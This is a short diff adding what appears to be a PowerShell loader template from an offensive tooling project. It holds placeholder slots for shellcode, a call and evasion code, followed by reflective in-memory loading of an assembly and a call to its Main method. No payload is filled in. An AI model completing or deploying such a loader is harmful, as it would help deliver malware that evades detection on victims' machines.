@@ -1,0 +1,10 @@
+//####CODE####
+
+$buf = ####SHELLCODE####
+
+//####CALL####
+
+//####EVASION####
+
+[System.Reflection.Assembly]::Load($buf)
+[proudcat.catloading]::Main()
